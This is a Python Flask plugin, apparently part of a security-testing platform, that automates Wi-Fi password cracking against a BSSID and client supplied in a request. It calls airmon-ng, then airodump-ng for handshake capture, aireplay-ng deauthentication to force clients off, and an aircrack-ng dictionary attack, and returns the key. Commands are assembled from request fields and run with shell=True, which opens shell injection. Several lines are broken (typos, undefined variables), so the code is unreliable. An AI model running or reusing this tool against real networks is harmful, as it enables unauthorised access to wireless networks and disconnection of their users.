import re,os,sys,time,signal,subprocess,json,random,string,argparse
from flask import Flask, request, jsonify
import requests,threading
from scapy.all import *

################ Flask launch #########################

PLATFORM_URL = "https://127.0.0.1:7000/api/service/result"
WEB_SERVER = "127.0.0.1"
PORT = 10001
app = Flask(__name__)

#######################################################

def crack_start(bssid, dssid, device, event):
    print(device)

    if "mon" in device:
        pass
    else:
        subprocess.run(["airmon-ng", "start", device])
        device = device + "mon"

    #command1 = ["airodump-ng", "--bssid", bssid, "-c", "1", "-w", "pack", device]
    #command2 = ["aireplay-ng", "-0", "10", "-a", bssid, "-c", dssid, device]
    command1 = "airodump-ng --bssid " + bssid+ " -c 1 -w pack "+ device
    command2 = "aireplay-ng -0 10 -a "+ bssid+ " -c " + dssid+ " " + device

    thread1 = threading.Thread(target=execute_command, args=(command1,))
    thread2 = threading.Thread(target=execute_command, args=(command2,))
    thread3 = threading,Thread(target=password_find, args=(bssid,))

    thread1.start()
    start_time = time.time()
    time.sleep(5)
    thread2.start()
    thread2.join(20)
    time.sleep(20)
    password = thread3.start()
    prinf(password)

    if thread2.is_alive():
        execution_time1 = time.time() - start_time
        if execution_time1 >= 20:
            subprocess.run(["pkill", "-f", " ".join(command2)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            thread2.join()
        return result, execution_time1
    
    event.set()
    time.sleep(20)
    thread1.terminate()
    thread1.join(30)

'''
    if thread1.is_alive():
        execution_time2 = time.time() - start_time
        if execution_time2 >= 30:
            subprocess.run(["pkill", "-f", " ".join(command1)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            thread1.terminate()
            thread1.join()
        return result, execution_time2
'''


#######################################################

def execute_command(command):
    subprocess.Popen(command, shell=True)

#######################################################

def password_find(bssid):
    pack = "pack-01.cap"
    wordlist = "./passwords.txt"

    output = subprocess.check_output(["aircrack-ng", "-w", wordlist, "-b", bssid, pack])
    output = output.decode('utf-8') 

    pattern = r'KEY FOUND!\s*\[\s*(.*?)\s*\]'
    match = re.search(pattern, output)
    result = {}


    if match:
        key_found = match.group(1)
        print("Key Found:", key_found)
        os.system("rm pack*")
        result["password"] = key_found
    else:
        print("Key Not Found")
        os.system("rm pack*")
    return result

#######################################################

@app.route('/start', methods=['POST'])
def run_threading_check():
    result = {}
    params = request.json
    if params != None:
        bssid = params.get("bssid")
        dssid = params.get("dssid")
        device = params.get("device")

        event = threading.Event()  # 创建事件

        t = threading.Thread(target=crack_start, args=(bssid, dssid, device, event,))
        t.start()

        event.wait(timeout=60)
        password_result = password_find(bssid)
        if "password" in password_result:
            result["password"] = password_result["password"]
        else:
            result["password_found"] = False
        return jsonify(result)
    else:
        result["status"] = "error"
        result["message"] = "Invalid parameters"

    return result

#######################################################

def WIFISecurity():
    jsdata = request.get_json()
    print('-------------------------', jsdata)
    if jsdata != None:
        r = run_threading_check()
        response = app.response_class(
            response=json.dumps(r),
            mimetype='application/json'
        )
        return "Plugin Start Execution"
    else:
        return 'No parameters'

app.run(host=WEB_SERVER, port=PORT)
